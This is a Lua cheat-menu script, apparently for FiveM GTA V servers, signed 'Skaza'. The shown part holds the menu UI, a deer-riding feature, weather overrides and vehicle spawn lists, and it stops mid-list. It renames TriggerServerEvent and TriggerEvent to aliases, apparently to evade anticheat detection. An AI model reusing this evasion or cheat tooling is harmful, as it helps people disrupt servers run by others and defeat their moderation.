--[[
ESX = nil
Citizen.CreateThread(
    function()
        while ESX == nil do
            chujaries(
                'esx:getSharedObject',
                function(a)
                    ESX = a
                end
            )
            Citizen.Wait(1000)
        end
    end
)
--]]
----    								Siema tutaj macie menu odemnie czyli Skazy
----									Pamietajcie #yebacfivem i enjoy !
----									Macie jeszcze tutaj obrazeczek odemnie kc was
------------------------------------------------------------------------------------------------------------------------------------
----       ===================        ===			===			===				 ===		===================					   -
----       =======					  ===			===			===				 ===		===================					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -	
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  =================			===				 ===						===					   -
----       ===						  =================			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ========			     	  ===			===			====================		===================					   -
----       =====================      ===			===			====================		===================					   -
------------------------------------------------------------------------------------------------------------------------------------


skaza= {}
skaza.debug = false
jebacariesa = TriggerServerEvent
chujaries = TriggerEvent

local LMl35d = false
local pass = "skaza"
llll4874 = enabled
KAKAAKAKAK = llll4874
pizda = RequestModel

udwdj = jebacariesa


Ggggg = GetHashKey

---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
Plane = { } 
Plane.debug = false

jd366213 = false
KZjx = jd366213
ihrug = nil
WADUI = ihrug

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = WADUI
		enum.handle = WADUI
	end
}
wdihwaduaw = true
jejejejej = wdihwaduaw
xjbvxyg3e = jejejejej
waduyh487r64 = xjbvxyg3e


function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = waduyh487r64
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = WADUI, WADUI
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end


---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	pizda(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end
---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(0)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)
local triggerr = "jebacariesa"
local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local menuso = {}
local p = {
    up = 172,
    down = 173,
    left = 174,
    right = 175,
    select = 176,
    back = 177
}
function LiLLL(text, items, CURENTIXDDd, DWADIOHDWwww13, callback)
    local itemsCount = #items
    local selectedItem = items[CURENTIXDDd]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if piesaries(text, selectedItem) then
        DWADIOHDWwww13 = CURENTIXDDd
        callback(CURENTIXDDd, DWADIOHDWwww13)
        return waduyh487r64
    elseif isCurrent then
        if currentKey == keys.left then
            if CURENTIXDDd > 1 then CURENTIXDDd = CURENTIXDDd - 1 else CURENTIXDDd = itemsCount end
        elseif currentKey == keys.right then
            if CURENTIXDDd < itemsCount then CURENTIXDDd = CURENTIXDDd + 1 else CURENTIXDDd = 1 end
        end
    else
        CURENTIXDDd = DWADIOHDWwww13
    end

    callback(CURENTIXDDd, DWADIOHDWwww13)
    return KZjx
end
---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
local q = 0
local s = nil
local t = nil
local u = 0.23
local v = 0.11
local w = 0.03
local A = 1.0
local B = 0.041
local C = 0
local D = 0.370
local E = 0.005
local F = 0.005
local function H(I)
    if skaza.debug then
        Citizen.Trace('[skaza] ' .. tostring(I))
    end
end
local function J(f, K, value)
    if f and menuso[f] then
        menuso[f][K] = value
        H(f .. ' menu property changed: { ' .. tostring(K) .. ', ' .. tostring(value) .. ' }')
    end
end
local function L(f)
    if f and menuso[f] then
        return menuso[f].visible
    else
        return false
    end
end
local function M(f, N, O)
    if f and menuso[f] then
        J(f, 'visible', N)
        if not O and menuso[f] then
            J(f, 'currentOption', 1)
        end
        if N then
            if f ~= t and L(t) then
                M(t, false)
            end
            t = f
        end
    end
end
local function P(I, x, y, Q, R, S, T, U, V)
    SetTextColour(R.r, R.g, R.b, R.a)
    SetTextFont(Q)
    SetTextScale(S, S)
    if U then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if menuso[t] then
        if T then
            SetTextCentre(T)
        elseif V then
            SetTextWrap(menuso[t].x, menuso[t].x + u - E)
            SetTextRightJustify(true)
        end
    end
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end
local function W(x, y, X, height, R)
    DrawRect(x, y, X, height, R.r, R.g, R.b, R.a)
end
local function Y()
    if menuso[t] then
        local x = menuso[t].x + u / 2
        local y = menuso[t].y + v / 2
        if menuso[t].titleBackgroundSprite then
            DrawSprite(
                menuso[t].titleBackgroundSprite.dict,
                menuso[t].titleBackgroundSprite.name,
                x,
                y,
                u,
                v,
                0.,
                255,
                255,
                255,
                255
            )
			---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
        else
            W(x, y, u, v, menuso[t].titleBackgroundColor)
        end
        P(menuso[t].title, x, y - v / 2 + w, menuso[t].titleFont, menuso[t].titleColor, A, true)
    end
end
local function Z()
    if menuso[t] then
        local x = menuso[t].x + u / 2
        local y = menuso[t].y + v + B / 2
        local a0 = {
            r = menuso[t].titleBackgroundColor.r,
            g = menuso[t].titleBackgroundColor.g,
            b = menuso[t].titleBackgroundColor.b,
            a = 255
        }
        W(x, y, u, B, menuso[t].subTitleBackgroundColor)
        P(menuso[t].subTitle, menuso[t].x + E, y - B / 2 + F, C, a0, D, false)
        if q > menuso[t].maxOptionCount then
            P(
                tostring(menuso[t].currentOption) .. ' / ' .. tostring(q),
                menuso[t].x + u,
                y - B / 2 + F,
                C,
                a0,
                D,
                false,
                false,
                true
            )
        end
    end
end
local function a1(I, a2)
    local x = menuso[t].x + u / 2
    local a3 = nil
    if menuso[t].currentOption <= menuso[t].maxOptionCount and q <= menuso[t].maxOptionCount then
        a3 = q
    elseif q > menuso[t].currentOption - menuso[t].maxOptionCount and q <= menuso[t].currentOption then
        a3 = q - (menuso[t].currentOption - menuso[t].maxOptionCount)
    end
    if a3 then
        local y = menuso[t].y + v + B + B * a3 - B / 2
        local a4 = nil
        local a5 = nil
        local a6 = nil
        local U = false
        if menuso[t].currentOption == q then
            a4 = menuso[t].menuFocusBackgroundColor
            a5 = menuso[t].menuFocusTextColor
            a6 = menuso[t].menuFocusTextColor
        else
            a4 = menuso[t].menuBackgroundColor
            a5 = menuso[t].menuTextColor
            a6 = menuso[t].menuSubTextColor
            U = true
        end
        W(x, y, u, B, a4)
        P(I, menuso[t].x + E, y - B / 2 + F, C, a5, D, false, U)
        if a2 then
            P(a2, menuso[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
        end
    end
end

function skaza.CreateMenu(f, a7)
    menuso[f] = {}
    menuso[f].title = a7
    menuso[f].subTitle = G
    menuso[f].visible = false
    menuso[f].previousMenu = nil
    menuso[f].aboutToBeClosed = false
    menuso[f].x = 0.75
    menuso[f].y = 0.20
    menuso[f].currentOption = 1
    menuso[f].maxOptionCount = 12
    menuso[f].titleFont = 7
    menuso[f].titleColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                local a8 = k(1.0)
                menuso[f].titleBackgroundColor = {
                    r = a8.r,
                    g = a8.g,
                    b = a8.b,
                 
                    a = 200
                }
                menuso[f].menuFocusBackgroundColor = {
                    r = a8.r,
                    g = a8.g,
                    b = a8.b,
                    a = 30
                }
           end
        end
    )
    menuso[f].titleBackgroundSprite = nil
    menuso[f].menuTextColor = {
        r = 0,
        g = 247,
        b = 247,
        a = 255
    }
    menuso[f].menuSubTextColor = {
        r = 255,
        g = 9,
        b = 214,
        a = 255
    }
	---- jak to znalazles to wiedz ze nic tu nie zrobisz XDDD musze ja to zrobic bo zakodowowalem menu przed kolejnymi edycjami pisz do mnie skarbie
    menuso[f].menuFocusTextColor = {
        r = 9,
        g = 255,
        b = 26,
        a = 255
    }
        
    menuso[f].menuBackgroundColor = {
        r = 255,
        g = 9,
        b = 214,
        a = 30
    }
	 
    menuso[f].subTitleBackgroundColor = {
        r = 102,
        g = 0,
        b = 85,
        a = 30
    }
    menuso[f].buttonPressedSound = {
        name = '~h~~b~-» ~w~Wybierz',
        set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
    }
    H(tostring(f) .. ' menu created')
end

function skaza.CreateSubMenu(f, a9, aa)
    if menuso[a9] then
        skaza.CreateMenu(f, menuso[a9].title)
        if aa then
            J(f, 'subTitle', aa)
        else
            J(f, 'subTitle', menuso[a9].subTitle)
        end
        J(f, 'previousMenu', a9)
        J(f, 'x', menuso[a9].x)
        J(f, 'y', menuso[a9].y)
        J(f, 'maxOptionCount', menuso[a9].maxOptionCount)
        J(f, 'titleFont', menuso[a9].titleFont)
        J(f, 'titleColor', menuso[a9].titleColor)
        J(f, 'titleBackgroundColor', menuso[a9].titleBackgroundColor)
        J(f, 'titleBackgroundSprite', menuso[a9].titleBackgroundSprite)
        J(f, 'menuTextColor', menuso[a9].menuTextColor)
        J(f, 'menuSubTextColor', menuso[a9].menuSubTextColor)
        J(f, 'menuFocusTextColor', menuso[a9].menuFocusTextColor)
        J(f, 'menuFocusBackgroundColor', menuso[a9].menuFocusBackgroundColor)
        J(f, 'menuBackgroundColor', menuso[a9].menuBackgroundColor)
        J(f, 'subTitleBackgroundColor', menuso[a9].subTitleBackgroundColor)
    else
        H('Failed to create ' .. tostring(f) .. ' submenu: ' .. tostring(a9) .. " parent menu doesn't exist")
    end
end

function skaza.CurrentMenu()
    return t
end

function skaza.OpenMenu(f)
    if f and menuso[f] then
        --PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        M(f, true)
        if menuso[f].titleBackgroundSprite then
            RequestStreamedTextureDict(menuso[f].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(menuso[f].titleBackgroundSprite.dict) do
                Citizen.Wait(0)
            end
        end
        H(tostring(f) .. ' menu opened')
    else
        H('Failed to open ' .. tostring(f) .. " menu: it doesn't exist")
    end
end

function skaza.IsMenuOpened(f)
    return L(f)
end

function skaza.IsAnyMenuOpened()
    for f, _ in pairs(o) do
        if L(f) then
            return true
        end
    end
    return false
end

function skaza.IsMenuAboutToBeClosed()
    if menuso[t] then
        return menuso[t].aboutToBeClosed
    else
        return false
    end
end

function skaza.CloseMenu()
    if menuso[t] then
        if menuso[t].aboutToBeClosed then
            menuso[t].aboutToBeClosed = false
            M(t, false)
            H(tostring(t) .. ' menu closed')
            PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            q = 0
            t = nil
            s = nil
        else
            menuso[t].aboutToBeClosed = true
            H(tostring(t) .. ' menu about to be closed')
        end
    end
end

function piesaries(I, a2)
    local ab = I
    if a2 then
        ab = '{ ' .. tostring(ab) .. ', ' .. tostring(a2) .. ' }'
    end
    if menuso[t] then
        q = q + 1
        local ac = menuso[t].currentOption == q
        a1(I, a2)
        if ac then
            if s == p.select then
                PlaySoundFrontend(-1, menuso[t].buttonPressedSound.name, menuso[t].buttonPressedSound.set, true)
                H(ab .. ' button pressed')
                return true
            elseif s == p.left or s == p.right then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end
        return false
    else
        H('Failed to create ' .. ab .. ' button: ' .. tostring(t) .. " menu doesn't exist")
        return false
    end
end

function smiecaries(I, f)
    if menuso[f] then
        if piesaries(I) then
            M(t, false)
            M(f, true, true)
            return true
        end
    else
        H('Failed to create ' .. tostring(I) .. ' menu button: ' .. tostring(f) .. " submenu doesn't exist")
    end
    return false
end

function jariesa(I, bool, ad)
    local ae = '~r~~h~wyl'
    if bool then
        ae = '~g~~h~wl'
    end
    if piesaries(I, ae) then
        bool = not bool
        H(tostring(I) .. ' checkbox changed to ' .. tostring(bool))
        ad(bool)
        return true
    end
    return false
end

function skaza.ComboBox(I, af, ag, ah, ad)
    local ai = #af
    local aj = af[ag]
    local ac = menuso[t].currentOption == q + 1
    if ai > 1 and ac then
        aj = '← ' .. tostring(aj) .. ' →'
    end
    if piesaries(I, aj) then
        ah = ag
        ad(ag, ah)
        return true
    elseif ac then
        if s == p.left then
            if ag > 1 then
                ag = ag - 1
            else
                ag = ai
            end
        elseif s == p.right then
            if ag < ai then
                ag = ag + 1
            else
                ag = 1
            end
        end
    else
        ag = ah
    end
    ad(ag, ah)
    return false
end

function skaza.Display()
    if L(t) then
        if menuso[t].aboutToBeClosed then
            skaza.CloseMenu()
        else
            ClearAllHelpMessages()
            Y()
            Z()
            s = nil
            if IsDisabledControlJustPressed(0, p.down) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if menuso[t].currentOption < q then
                    menuso[t].currentOption = menuso[t].currentOption + 1
                else
                    menuso[t].currentOption = 1
                end
            elseif IsDisabledControlJustPressed(0, p.up) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if menuso[t].currentOption > 1 then
                    menuso[t].currentOption = menuso[t].currentOption - 1
                else
                    menuso[t].currentOption = q
                end
            elseif IsDisabledControlJustPressed(0, p.left) then
                s = p.left
            elseif IsDisabledControlJustPressed(0, p.right) then
                s = p.right
            elseif IsDisabledControlJustPressed(0, p.select) then
                s = p.select
            elseif IsDisabledControlJustPressed(0, p.back) then
                if menuso[menuso[t].previousMenu] then
                    PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    M(menuso[t].previousMenu, true)
                else
                    skaza.CloseMenu()
                end
            end
            q = 0
        end
    end
end

function skaza.SetMenuWidth(f, X)
    J(f, 'width', X)
end

function skaza.SetMenuX(f, x)
    J(f, 'x', x)
end

function skaza.SetMenuY(f, y)
    J(f, 'y', y)
end

function skaza.SetMenuMaxOptionCountOnScreen(f, count)
    J(f, 'maxOptionCount', count)
end

function skaza.SetTitleColor(f, r, g, b, ak)
    J(
        f,
        'titleColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].titleColor.a
        }
    )
end

function skaza.SetTitleBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'titleBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].titleBackgroundColor.a
        }
    )
end

function skaza.SetTitleBackgroundSprite(f, al, am)
    J(
        f,
        'titleBackgroundSprite',
        {
            dict = al,
            name = am
        }
    )
end

function skaza.SetSubTitle(f, I)
    J(f, 'subTitle', I)
end

function skaza.SetMenuBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'menuBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuBackgroundColor.a
        }
    )
end

function skaza.SetMenuTextColor(f, r, g, b, ak)
    J(
        f,
        'menuTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuTextColor.a
        }
    )
end

function skaza.SetMenuSubTextColor(f, r, g, b, ak)
    J(
        f,
        'menuSubTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuSubTextColor.a
        }
    )
end
local wtB2JF = "jebacariesa"
function skaza.SetMenuFocusColor(f, r, g, b, ak)
    J(
        f,
        'menuFocusColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuFocusColor.a
        }
    )
end

function skaza.SetMenuButtonPressedSound(f, name, an)
    J(
        f,
        'buttonPressedSound',
        {
            ['name'] = name,
            ['set'] = an
        }
    )
end

function KeyboardInput(ao, ap, aq)
    AddTextEntry('FMMC_KEY_TIP1', ao .. ':')
    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ap, '', '', '', aq)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        AddTextEntry('FMMC_KEY_TIP1', '')
        local m = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return m
    else
        AddTextEntry('FMMC_KEY_TIP1', '')
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
local bw = waduyh487r64
local function ar()
    local as = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            as[#as + 1] = i
        end
    end
    return as
end
if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(waduyh487r64)
            SetForcePedFootstepsTracks(waduyh487r64)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
		
function DrawText3D(x, y, z, I, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(7)
    SetTextProportional(0)
    SetTextScale(0.0, 0.35)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(I)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function math.round(at, au)
    return tonumber(string.format('%.' .. (au or 0) .. 'f', at))
end
local function k(l)
    local m = {}
    local n = GetGameTimer() / 1000
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local function av(I, aw)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(I)
    DrawNotification(aw, false)
    if rgbnot then
        for i = 0, 0 do
            i = i + 5
            SetNotificationBackgroundColor(i)
        end
    else
        SetNotificationBackgroundColor(5)
    end
end

function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end
local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
